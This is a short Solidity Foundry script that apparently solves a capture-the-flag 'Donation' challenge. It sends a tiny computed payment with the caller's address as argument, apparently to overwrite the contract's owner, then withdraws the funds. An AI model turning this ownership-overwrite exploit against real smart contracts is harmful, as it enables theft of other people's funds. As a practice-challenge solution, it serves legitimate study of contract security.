pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../../src/math-challenge/IDonation.sol";

contract MyContract is Script {

    function run() public {
        
        vm.startBroadcast();
        
        IDonationChallenge donationChallenge = IDonationChallenge(0x91C554fad616170Cb2223E4AA2b27c5949Dc5299);

        uint256 addressToUint = uint256(uint160(msg.sender));

        uint256 scale = 10**18 * 1 ether;

        uint256 amount = addressToUint/scale;
        
        donationChallenge.donate{value: amount}(addressToUint);

        donationChallenge.withdraw();

        vm.stopBroadcast();
    }
}